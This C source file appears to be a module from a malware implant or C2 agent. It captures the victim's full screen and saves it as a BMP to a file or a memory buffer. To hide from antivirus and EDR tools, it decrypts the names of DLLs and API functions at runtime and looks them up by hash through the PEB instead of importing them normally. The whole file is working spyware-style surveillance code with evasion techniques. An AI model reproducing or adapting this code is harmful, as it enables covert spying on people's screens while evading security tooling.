#include "screenshot.h"
#include "config.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "enc_strings.h"
#include <windows.h>

#ifdef ENABLE_SCREENSHOT
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#pragma pack(push, 1)
typedef struct {
    unsigned short  bfType;
    unsigned int    bfSize;
    unsigned short  bfReserved1;
    unsigned short  bfReserved2;
    unsigned int    bfOffBits;
} BMPFileHeader;

typedef struct {
    unsigned int    biSize;
    int             biWidth;
    int             biHeight;
    unsigned short  biPlanes;
    unsigned short  biBitCount;
    unsigned int    biCompression;
    unsigned int    biSizeImage;
    int             biXPelsPerMeter;
    int             biYPelsPerMeter;
    unsigned int    biClrUsed;
    unsigned int    biClrImportant;
} BMPInfoHeader;
#pragma pack(pop)

/* ── API function pointer types ─────────────────────────────────── */

/* user32.dll */
typedef HDC    (WINAPI *pGetDC)(HWND);
typedef int    (WINAPI *pReleaseDC)(HWND, HDC);
typedef int    (WINAPI *pGetSystemMetrics)(int);

/* gdi32.dll */
typedef HDC    (WINAPI *pCreateCompatibleDC)(HDC);
typedef BOOL   (WINAPI *pDeleteDC)(HDC);
typedef HBITMAP(WINAPI *pCreateCompatibleBitmap)(HDC, int, int);
typedef HGDIOBJ(WINAPI *pSelectObject)(HDC, HGDIOBJ);
typedef BOOL   (WINAPI *pBitBlt)(HDC, int, int, int, int, HDC, int, int, DWORD);
typedef int    (WINAPI *pGetDIBits)(HDC, HBITMAP, UINT, UINT, LPVOID, LPBITMAPINFO, UINT);
typedef BOOL   (WINAPI *pDeleteObject)(HGDIOBJ);

/* kernel32.dll */
typedef HANDLE (WINAPI *pCreateFileA_ss)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL   (WINAPI *pWriteFile_ss)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL   (WINAPI *pCloseHandle_ss)(HANDLE);

/* ── Resolved API pointers ──────────────────────────────────────── */

static struct {
    /* user32 */
    pGetDC                  pGetDC;
    pReleaseDC              pReleaseDC;
    pGetSystemMetrics       pGetSM;
    /* gdi32 */
    pCreateCompatibleDC     pCreateDC;
    pDeleteDC               pDeleteDC;
    pCreateCompatibleBitmap pCreateBmp;
    pSelectObject           pSelectObj;
    pBitBlt                 pBitBlt;
    pGetDIBits              pGetDIBits;
    pDeleteObject           pDelObj;
    /* kernel32 */
    pCreateFileA_ss         pCreateFile;
    pWriteFile_ss           pWriteFile;
    pCloseHandle_ss         pCloseHandle;
    int                     ready;
} ss_api;

static void *ss_resolve(void *mod, const char *name) {
    return mirage_get_function_by_hash(mod, mirage_encrypted_hash_func(name));
}

static int ss_ensure_api(void) {
    if (ss_api.ready) return 1;

    char dll[32];
    char fn[32];

    /* user32.dll */
    enc_decrypt(enc_user32, ENC_USER32_LEN, dll);
    void *u32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!u32) return 0;

    enc_decrypt(enc_GetDC, ENC_GETDC_LEN, fn);
    ss_api.pGetDC = (pGetDC)ss_resolve(u32, fn);
    enc_decrypt(enc_ReleaseDC, ENC_RELEASEDC_LEN, fn);
    ss_api.pReleaseDC = (pReleaseDC)ss_resolve(u32, fn);
    enc_decrypt(enc_GetSystemMetrics, ENC_GETSYSTEMMETRICS_LEN, fn);
    ss_api.pGetSM = (pGetSystemMetrics)ss_resolve(u32, fn);

    /* gdi32.dll */
    enc_decrypt(enc_gdi32, ENC_GDI32_LEN, dll);
    void *gdi = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!gdi) return 0;

    enc_decrypt(enc_CreateCompatibleDC, ENC_CREATECOMPATIBLEDC_LEN, fn);
    ss_api.pCreateDC = (pCreateCompatibleDC)ss_resolve(gdi, fn);
    enc_decrypt(enc_DeleteDC, ENC_DELETEDC_LEN, fn);
    ss_api.pDeleteDC = (pDeleteDC)ss_resolve(gdi, fn);
    enc_decrypt(enc_CreateCompatibleBitmap, ENC_CREATECOMPATIBLEBITMAP_LEN, fn);
    ss_api.pCreateBmp = (pCreateCompatibleBitmap)ss_resolve(gdi, fn);
    enc_decrypt(enc_SelectObject, ENC_SELECTOBJECT_LEN, fn);
    ss_api.pSelectObj = (pSelectObject)ss_resolve(gdi, fn);
    enc_decrypt(enc_BitBlt, ENC_BITBLT_LEN, fn);
    ss_api.pBitBlt = (pBitBlt)ss_resolve(gdi, fn);
    enc_decrypt(enc_GetDIBits, ENC_GETDIBITS_LEN, fn);
    ss_api.pGetDIBits = (pGetDIBits)ss_resolve(gdi, fn);
    enc_decrypt(enc_DeleteObject, ENC_DELETEOBJECT_LEN, fn);
    ss_api.pDelObj = (pDeleteObject)ss_resolve(gdi, fn);

    /* kernel32.dll — for CreateFileA/WriteFile/CloseHandle */
    enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!k32) return 0;

    enc_decrypt(enc_CreateFileA, ENC_CREATEFILEA_LEN, fn);
    ss_api.pCreateFile = (pCreateFileA_ss)ss_resolve(k32, fn);
    enc_decrypt(enc_WriteFile, ENC_WRITEFILE_LEN, fn);
    ss_api.pWriteFile = (pWriteFile_ss)ss_resolve(k32, fn);
    enc_decrypt(enc_CloseHandle, ENC_CLOSEHANDLE_LEN, fn);
    ss_api.pCloseHandle = (pCloseHandle_ss)ss_resolve(k32, fn);

    if (!ss_api.pGetDC || !ss_api.pReleaseDC || !ss_api.pGetSM ||
        !ss_api.pCreateDC || !ss_api.pDeleteDC || !ss_api.pCreateBmp ||
        !ss_api.pSelectObj || !ss_api.pBitBlt || !ss_api.pGetDIBits ||
        !ss_api.pDelObj || !ss_api.pCreateFile || !ss_api.pWriteFile ||
        !ss_api.pCloseHandle)
        return 0;

    ss_api.ready = 1;
    return 1;
}

/* ── BMP helpers ────────────────────────────────────────────────── */

static int write_bmp_file(const char *path, const unsigned char *data, size_t len) {
    HANDLE hf;
    DWORD  written;

    hf = ss_api.pCreateFile(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                            FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE)
        return -1;

    ss_api.pWriteFile(hf, data, (DWORD)len, &written, NULL);
    ss_api.pCloseHandle(hf);
    return (written == (DWORD)len) ? 0 : -1;
}

static unsigned char *build_bmp(const unsigned char *pixels,
                                int width, int height,
                                size_t *out_size) {
    int row_bytes   = width * 4;
    int padding     = (4 - (row_bytes % 4)) % 4;
    int stride      = row_bytes + padding;
    int img_size    = stride * height;
    int file_size   = sizeof(BMPFileHeader) + sizeof(BMPInfoHeader) + img_size;

    unsigned char *bmp = (unsigned char *)malloc(file_size);
    if (!bmp) return NULL;

    memset(bmp, 0, file_size);

    BMPFileHeader *fh = (BMPFileHeader *)bmp;
    fh->bfType      = 0x4D42;
    fh->bfSize      = (unsigned int)file_size;
    fh->bfReserved1 = 0;
    fh->bfReserved2 = 0;
    fh->bfOffBits   = sizeof(BMPFileHeader) + sizeof(BMPInfoHeader);

    BMPInfoHeader *ih = (BMPInfoHeader *)(bmp + sizeof(BMPFileHeader));
    ih->biSize        = sizeof(BMPInfoHeader);
    ih->biWidth       = width;
    ih->biHeight      = -height;
    ih->biPlanes      = 1;
    ih->biBitCount    = 32;
    ih->biCompression = 0;
    ih->biSizeImage   = (unsigned int)img_size;

    unsigned char *dst = bmp + sizeof(BMPFileHeader) + sizeof(BMPInfoHeader);
    for (int y = 0; y < height; y++) {
        memcpy(dst + y * stride, pixels + y * row_bytes, (size_t)row_bytes);
    }

    *out_size = (size_t)file_size;
    return bmp;
}

static int capture_screen(unsigned char **pixels, int *w, int *h) {
    HDC hScreen    = ss_api.pGetDC(NULL);
    HDC hMemDC     = ss_api.pCreateDC(hScreen);
    int cx         = ss_api.pGetSM(SM_CXSCREEN);
    int cy         = ss_api.pGetSM(SM_CYSCREEN);

    HBITMAP hBitmap = ss_api.pCreateBmp(hScreen, cx, cy);
    HGDIOBJ hOld    = ss_api.pSelectObj(hMemDC, hBitmap);

    ss_api.pBitBlt(hMemDC, 0, 0, cx, cy, hScreen, 0, 0, SRCCOPY);

    BITMAPINFO bi;
    memset(&bi, 0, sizeof(bi));
    bi.bmiHeader.biSize        = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth       = cx;
    bi.bmiHeader.biHeight      = -cy;
    bi.bmiHeader.biPlanes      = 1;
    bi.bmiHeader.biBitCount    = 32;
    bi.bmiHeader.biCompression = BI_RGB;

    size_t img_bytes = (size_t)cx * (size_t)cy * 4;
    unsigned char *buf = (unsigned char *)malloc(img_bytes);
    if (!buf) {
        ss_api.pSelectObj(hMemDC, hOld);
        ss_api.pDelObj(hBitmap);
        ss_api.pDeleteDC(hMemDC);
        ss_api.pReleaseDC(NULL, hScreen);
        return -1;
    }

    ss_api.pGetDIBits(hMemDC, hBitmap, 0, cy, buf, &bi, DIB_RGB_COLORS);

    ss_api.pSelectObj(hMemDC, hOld);
    ss_api.pDelObj(hBitmap);
    ss_api.pDeleteDC(hMemDC);
    ss_api.pReleaseDC(NULL, hScreen);

    *pixels = buf;
    *w = cx;
    *h = cy;
    return 0;
}

/* ── Public API ────────────────────────────────────────────── */

int screenshot_capture(const char *output_path) {
    if (!ss_ensure_api()) return -1;

    unsigned char *pixels = NULL;
    int w = 0, h = 0;

    if (capture_screen(&pixels, &w, &h) != 0)
        return -1;

    size_t bmp_size = 0;
    unsigned char *bmp = build_bmp(pixels, w, h, &bmp_size);
    free(pixels);

    if (!bmp)
        return -1;

    int rc = write_bmp_file(output_path, bmp, bmp_size);
    free(bmp);
    return rc;
}

int screenshot_capture_to_buffer(unsigned char **buf, size_t *len) {
    if (!ss_ensure_api()) return -1;

    unsigned char *pixels = NULL;
    int w = 0, h = 0;

    if (!buf || !len)
        return -1;

    if (capture_screen(&pixels, &w, &h) != 0)
        return -1;

    size_t bmp_size = 0;
    unsigned char *bmp = build_bmp(pixels, w, h, &bmp_size);
    free(pixels);

    if (!bmp)
        return -1;

    *buf = bmp;
    *len = bmp_size;
    return 0;
}

#endif /* ENABLE_SCREENSHOT */
